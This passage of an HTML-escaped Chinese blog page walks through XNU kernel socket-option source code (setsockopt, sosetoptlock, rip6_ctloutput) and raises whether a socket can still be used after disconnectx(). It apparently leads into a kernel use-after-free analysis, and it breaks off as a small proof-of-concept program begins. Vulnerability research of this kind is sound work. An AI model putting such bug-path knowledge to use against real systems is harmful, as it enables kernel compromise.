			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sooptcopyin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
			    &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

			&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inp_flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sotoinpcb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;optval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

		&lt;span class=&quot;nl&quot;&gt;default:&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip6_ctloutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 选项名为IPV6_USE_MIN_MTU&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rip6_ctloutput()&lt;/code&gt;并不是常规的层层调用回去，而是使用结构体赋值的形式进行调用&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pr_ctloutput&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;rip6_ctloutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这个也简单，直接搜索&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-&amp;gt;pr_ctloutput&lt;/code&gt;，当&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;level&lt;/code&gt;不是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOL_SOCKET&lt;/code&gt;的时候，就调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rip6_ctloutput()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;sosetoptlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockopt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dolock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so_state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SS_CANTRCVMORE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SS_CANTSENDMORE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
	    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SS_CANTRCVMORE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SS_CANTSENDMORE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
	    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so_flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOF_NPX_SETOPTSHUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;cm&quot;&gt;/* the socket has been shutdown, no more sockopt's */&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EINVAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt_level&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOL_SOCKET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so_proto&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
		    &lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so_proto&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pr_ctloutput&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so_proto&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pr_ctloutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ENOPROTOOPT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最后回到最早的调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setsockopt()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;setsockopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;setsockopt_args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;__unused&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int32_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;retval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockopt&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;AUDIT_ARG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;valsize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EFAULT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;cm&quot;&gt;/* No bounds checking on size (it's unsigned) */&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt_dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOPT_SET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt_level&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;level&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt_val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt_valsize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;valsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt_p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EINVAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#if CONFIG_MACF_SOCKET_SUBSET
&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mac_socket_check_setsockopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kauth_cred_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	    &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#endif &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* MAC_SOCKET_SUBSET */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sosetoptlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* will lock socket */&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;out:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;file_drop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;以上为参数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IPPROTO_IPV6&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IPV6_USE_MIN_MTU&lt;/code&gt;的由来&lt;/p&gt;

&lt;p&gt;但记住，现在是Socket还正常存在的情况，如果调用了函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disconnectx()&lt;/code&gt;呢？&lt;/p&gt;

&lt;p&gt;Socket被关闭了还能操作吗？&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define IPV6_USE_MIN_MTU 42
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;socklen_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getsockopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_IPV6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPV6_USE_MIN_MTU&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcp_sock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// SOPT_SET&lt;/span&gt;
